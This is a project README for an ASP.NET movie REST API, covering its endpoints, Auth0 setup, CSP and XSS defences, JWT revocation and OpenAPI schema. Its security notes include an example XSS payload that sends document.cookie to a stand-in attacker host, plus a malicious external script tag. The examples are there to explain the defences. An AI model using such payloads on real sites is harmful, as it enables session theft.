# REST Movie Service

REST API for managing movies, directors, and production companies.

## Endpoints
- Movies: GetAll, GetByID, Create, Update, Delete
- Directors: GetAll, GetByID
- ProductionCompanies: GetAll, GetByID

GetAll endpoints use pagination.

## Tech Stack
- ASP.NET
- SQLite database file
- Entity Framework Core (ORM)

## Run with Docker
```bash
cd services/rest
docker compose up -d
```

## Security Notes
### SQL Injection
EF Core protects against SQL injection by using parameterized queries, so user input is never treated as raw SQL.

### CSRF
CSRF occurs when an attacker tricks a user's browser into sending a request to another website. For APIs that store tokens in headers (not cookies), CSRF is not a concern.

### XSS (Cross-Site Scripting)
The XSS process:
- Injection: An attacker sends a malicious script via an API request (for example, in a comment field, username, or profile description).

    Example payload:
    ```html
    <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
    ```

- Storage/Processing: The API receives the JSON payload and stores the malicious string without sanitizing it.
- Execution: A victim's browser requests data from the API. The frontend injects the malicious string into the DOM (for example, using `.innerHTML`), and the browser executes the script.

#### XSS Prevention
String inputs for `Genre` and `Title` in Create and Update movie endpoints are sanitized using HtmlSanitizer (NuGet package).
HtmlSanitizer works by:
- Parsing the HTML input
- Removing dangerous tags
- Removing dangerous attributes
- Returning only safe HTML

A Content-Security-Policy (CSP) header is added to every response. It tells the browser which resources (scripts, styles, images) are allowed to load and execute, acting as an additional browser-side layer against XSS and content injection attacks.

How CSP protects against XSS (three main ways):
1. Blocking inline scripts

     By default, a strong CSP blocks inline scripts, which are code written directly inside `<script>` tags or HTML attributes (like `onclick`).

     - Attack: An attacker stores `<script>alert('xss')</script>` in your database.
     - Protection: Even if the browser renders that tag, the CSP says "no inline scripts" and the browser ignores it.

2. Restricting trusted domains

     If you do need scripts, you can specify exactly where they come from.

     - Attack: An attacker tries to load a malicious file: `<script src="https://evil-hacker.com/steal.js"></script>`.
     - Protection: Your CSP might say `script-src 'self'`. The browser checks the source, sees it isn't from your domain, and blocks the request.

3. Disabling `eval()`

     CSP prevents the use of `eval()`, which turns strings into executable code. This closes a major loophole used by attackers to sneak scripts past basic filters.

Common CSP directives used:
- `default-src 'none'`: Allow nothing but HTML unless explicitly allowed (no scripts, CSS, images, API calls, fonts, WebSocket connections, and so on).
- `frame-ancestors 'none'`: Prevent the API from being embedded (for example, `<iframe>`, `<embed>`). This protects against clickjacking.
- `base-uri 'none'`: Prevent relative links from resolving to an attacker domain (for example, via a `<base href="https://evil.com">` tag).

## OAuth 2.0 (Auth0)
This API uses Auth0 as the OAuth server. A custom API is created in Auth0 to register this API. Steps:
1. Give the custom API a name and a unique identifier (used as the `audience` parameter on authorization calls).
2. For the Logout endpoint we need an ID for the generated JWT, so choose the JSON Web Token (JWT) Profile, RFC 9068.
3. For the signing algorithm, use RS256.
4. Creating this generates values for Authority and Audience.
5. After creating the API reference, add an application to it (a client used by the login endpoint).
6. In the left menu, go to Applications -> Applications and click Create Application.
7. Give it a name and choose Native.
8. Open Advanced Settings, find Grant Types, and check the box for Password.
9. Under the API Access tab, grant User-delegated Access to the API reference created earlier.
10. In the left menu, go to User Management -> Users and create a new user with the Username-Password-Authentication connection.

Test with curl:
```bash
curl --request POST \
        --url Auth0_Authority \
        --header 'content-type: application/json' \
        --data '{
                "client_id":"",
                "client_secret":"",
                "audience":"",
                "grant_type":"client_credentials"
        }'
```

The login endpoint in this API is a proxy that creates an HTTP client to call the OAuth provider, which then generates the JWT. The login endpoint acts as a client.

To troubleshoot Auth0 configuration issues, edit the login endpoint method to return:
```csharp
var content = await response.Content.ReadAsStringAsync();

return StatusCode((int)response.StatusCode, content);
```

## Version Strategy
This API uses URI versioning, meaning the version is in the path (for example, `api/v1/movies`). This is defined in each controller below the namespace.

## CORS
CORS is configured in `Program.cs` to allow any method from the client `http://localhost:3000`.
CORS is applied with `app.UseCors("AllowFrontend");`.

## JWT Revocation Strategy
The API uses blacklisting because it is the most stateful strategy. When a user logs out, the token is stored in Redis.
To check if the token is stored in Redis, use this command:
```bash
docker exec -it <container-name> redis-cli
127.0.0.1:6379> keys *
```

## Headers
### Request headers
If a request has a body, a `Content-Type: application/json` header is sent.
For authenticated endpoints, an `Authorization` header with a bearer token is sent.
Postman automatically adds these headers to requests:
- `Content-Type: text/plain`
    Helps the server identify the media type of the request body.
- `Content-Length: 68` (calculated when request is sent)
    The size of the request body.
- `Host: localhost:5286` (calculated when request is sent)
    Domain name the request is sent to.
- `User-Agent: PostmanRuntime/7.51.1`
    Identifies the client.
- `Accept: */*`
    Identifies what response content types the client understands (`*/*` means all).
- `Accept-Encoding: gzip, deflate, br`
    Indicates the content encoding the sender can understand.
- `Connection: keep-alive`
    Tells the server to keep the underlying network connection open (allows Postman to reuse the same connection for faster response times).

### Response headers
If a response has a body, a `Content-Type: application/json` header is sent.
As mentioned in the XSS Prevention section, a CSP header is sent with all responses.
ASP.NET automatically adds these headers to responses:
- `Date: Tue, 19 May 2026 12:30:00 GMT`
    When the response was generated.
- `Server: Kestrel`
    Identifies the web server software handling the request. This can leak infrastructure information, so you might remove it.
- `Transfer-Encoding: chunked`
    Describes how the response body is transferred over HTTP. Chunked means the server sends the response in pieces, without knowing the full response size beforehand.

## Hypermedia as the Engine of Application State (HATEOAS)
All endpoints implement HATEOAS with contextual links, using the HAL (Hypertext Application Language) convention.

## Postman Tests
To run the tests, you need two environment variables as seen in `REST-API-v1.postman_environment.json`.

## OpenAPI Documentation
A global security requirement is defined at the start of the documentation:
```yaml
security:
    - bearerAuth: []
```

All endpoints use this except login, which is defined like this:
```yaml
security: []
```

The security scheme is defined under components:
```yaml
securitySchemes:
    bearerAuth:
        type: http
        scheme: bearer
        bearerFormat: JWT
```

From the documentation (https://swagger.io/docs/specification/v3_0/authentication/bearer-authentication/):
In OpenAPI 3.0, Bearer authentication is a security scheme with `type: http` and `scheme: bearer`.

The `additionalProperties` in `ErrorResponseBadRequest` is used inside the `errors` object because it contains dynamic property names. Each property contains an array of strings.
Examples:
```json
{
        "type": "https://tools.ietf.org/html/rfc9110#section-15.5.1",
        "title": "One or more validation errors occurred.",
        "status": 400,
        "errors": {
                "Password": [
                        "The Password field is required."
                ]
        },
        "traceId": "00-6cc387297baa022a933c26bc23d79f50-96835d85c51a22e9-00"
}
```
```json
{
        "type": "https://tools.ietf.org/html/rfc9110#section-15.5.1",
        "title": "One or more validation errors occurred.",
        "status": 400,
        "errors": {
                "$": [
                        "The JSON object contains a trailing comma at the end which is not supported in this mode. Change the reader options. Path: $ | LineNumber: 2 | BytePositionInLine: 0."
                ],
                "request": [
                        "The request field is required."
                ]
        },
        "traceId": "00-9cad40fc0ad19787dcfb4127a3c97ef2-c7ffa9d52bdc5bc8-00"
}
```
